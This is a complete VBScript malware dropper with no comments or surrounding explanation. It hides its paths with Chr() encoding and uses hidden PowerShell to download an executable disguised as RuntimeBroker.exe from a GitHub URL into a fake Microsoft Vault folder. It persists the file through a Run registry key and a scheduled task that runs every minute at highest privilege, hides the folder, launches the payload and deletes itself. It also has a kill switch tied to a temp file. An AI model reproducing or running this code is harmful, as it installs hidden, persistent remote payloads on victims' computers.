Set o = CreateObject("WScript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")
p1 = o.ExpandEnvironmentStrings(Chr(37)&Chr(65)&Chr(80)&Chr(80)&Chr(68)&Chr(65)&Chr(84)&Chr(65)&Chr(37)) & Chr(92)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(92)&Chr(86)&Chr(97)&Chr(117)&Chr(108)&Chr(116)
e1 = p1 & Chr(92)&Chr(86)&Chr(97)&Chr(117)&Chr(108)&Chr(116)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(105)&Chr(99)&Chr(101)&Chr(46)&Chr(101)&Chr(120)&Chr(101)
k1 = o.ExpandEnvironmentStrings(Chr(37)&Chr(84)&Chr(69)&Chr(77)&Chr(80)&Chr(37)) & Chr(92)&Chr(115)&Chr(116)&Chr(111)&Chr(112)&Chr(46)&Chr(116)&Chr(120)&Chr(116)
If f.FileExists(k1) Then
    o.Run "schtasks /delete /tn ""SysWorker"" /f", 0, True
    o.Run "taskkill /f /im VaultService.exe", 0, True
    If f.FolderExists(p1) Then f.DeleteFolder(p1), True
    f.DeleteFile(WScript.ScriptFullName)
    WScript.Quit
End If
If Not f.FolderExists(p1) Then f.CreateFolder(p1)
If Not f.FileExists(e1) Then
    o.Run "powershell -WindowStyle Hidden -Command ""(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/TDSScripter/RuntimeBroker/main/RuntimeBroker.exe', '" & e1 & "')""", 0, True
End If
If f.FileExists(e1) Then
    o.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysWorker", e1, "REG_SZ"
    o.Run "schtasks /create /tn ""SysWorker"" /tr """ & e1 & """ /sc minute /mo 1 /rl highest /f", 0, True
    o.Run "attrib +s +h +r """ & p1 & """", 0, True
    o.Run """" & e1 & """", 0, False
End If
f.DeleteFile(WScript.ScriptFullName)